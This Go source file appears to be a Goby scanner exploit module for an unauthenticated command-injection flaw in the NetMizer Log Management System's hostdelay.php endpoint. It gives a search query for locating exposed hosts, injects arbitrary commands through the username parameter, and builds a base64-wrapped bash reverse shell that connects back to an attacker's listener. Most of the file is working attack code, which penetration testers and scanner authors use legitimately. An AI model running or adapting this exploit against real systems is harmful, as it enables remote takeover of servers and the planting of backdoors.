package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"regexp"
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "NetMizer Log Management System /data/hostdelay/hostdelay.php Command Execution Vulnerability",
    "Description": "<p>The NetMizer Log Management System is a plug-in system that works with NetMizer traffic management equipment, a global provider of integrated application delivery and application security solutions for business intelligence networks. It provides global enterprises and operators with solutions that ensure full availability, high performance and complete security for business-critical applications. Command execution vulnerability exists at the hostdelet.php interface of the NetMizer log management system. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "NetMizer-Log-MS",
    "Homepage": "http://www.lingzhou.com.cn/",
    "DisclosureDate": "2024-07-16",
    "PostTime": "2024-07-18",
    "Author": "1977250845@qq.com",
    "FofaQuery": "title=\"NetMizer\" && body=\"NetMizer\"",
    "GobyQuery": "title=\"NetMizer\" && body=\"NetMizer\"",
    "Level": "3",
    "Impact": "<p>Command execution vulnerability exists at the hostdelet.php interface of the NetMizer log management system. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>Update to the latest version</p>",
    "References": [
        "https://blog.csdn.net/weixin_43567873/article/details/137382430"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash,BySh",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/data/hostdelay/hostdelay.php?action=list&username=|whoami",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "NetMizer 日志管理系统 /data/hostdelay/hostdelay.php 命令执行漏洞",
            "Product": "NetMizer-日志管理系统",
            "Description": "<p>NetMizer日志管理系统是一个与NetMizer流量管理设备配合使用的外挂系统，NetMizer是提供集成应用交付和应用安全解决方案以实现业务智能网络的全球供应商。它为全球企业和运营商提供确保关键业务应用的全面可用性、高性能和完善的安全性的解决方案。NetMizer 日志管理系统hostdelay.php接口处存在命令执行漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>及时更新到最新版本</p>",
            "Impact": "<p>NetMizer 日志管理系统hostdelay.php接口处存在命令执行漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "NetMizer Log Management System /data/hostdelay/hostdelay.php Command Execution Vulnerability",
            "Product": "NetMizer-Log-MS",
            "Description": "<p>The NetMizer Log Management System is a plug-in system that works with NetMizer traffic management equipment, a global provider of integrated application delivery and application security solutions for business intelligence networks. It provides global enterprises and operators with solutions that ensure full availability, high performance and complete security for business-critical applications. Command execution vulnerability exists at the hostdelet.php interface of the NetMizer log management system. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>Update to the latest version<br></p>",
            "Impact": "<p>Command execution vulnerability exists at the hostdelet.php interface of the NetMizer log management system. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10972"
}`

	setPayloadRequestHashUIacg28fvhjwvfdsvcw := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {

		//对command进行url编码
		command = url.QueryEscape(command)
		//漏洞url地址
		pocurlOriginal := "/data/hostdelay/hostdelay.php"
		pocurl := pocurlOriginal + "?action=list&username=|" + command
		commandResult := ""
		makeRequest := httpclient.NewGetRequestConfig(pocurl)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		makeRequest.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		makeRequest.Header.Store("Accept-Encoding", "gzip, deflate")
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			commandResult = resp.RawBody
			return commandResult, pocurlOriginal, nil
		} else {
			return commandResult, pocurlOriginal, err
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败

		return commandResult, pocurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashUIacg28fvhjwvfdsvcw

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashUIacg28fvhjwvfdsvcw

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {

				typeList := map[string]func(string) string{
					"ByBash":       godclient.ReverseTCPByBash,
					"ByBashBase64": godclient.ReverseTCPByBash,
					"BySh":         godclient.ReverseTCPBySh,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
					command := typeList[reverseType](rp)
					if reverseType == "ByBashBase64" {
						command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
					}
					return command, waitSessionCh, nil
				}

				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					re := regexp.MustCompile(`^\{"success":true,"datas":\[\],"total":`)
					//分情况提取
					if re.MatchString(Result) {
						re := regexp.MustCompile(`"total":"(.*?)\\n"`)
						matches := re.FindAllStringSubmatch(Result, -1)
						for _, match := range matches {
							if len(match) > 1 {
								Result = match[1]
							}
						}

					} else {
						re := regexp.MustCompile(`"username":"(.*?)"`)

						matches := re.FindAllStringSubmatch(Result, -1)
						var result strings.Builder
						// 提取并输出 username 的内容
						for _, match := range matches {
							if len(match) > 1 {
								result.WriteString(match[1] + "\n")
							}
						}
						reAgain := regexp.MustCompile(`"total":"(.*?)\\n"`)

						matchess := reAgain.FindAllStringSubmatch(Result, -1)

						for _, match := range matchess {
							if len(match) > 1 {
								result.WriteString(match[1] + "\n")
							}
						}
						finalResult := result.String()
						Result = finalResult
					}

					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
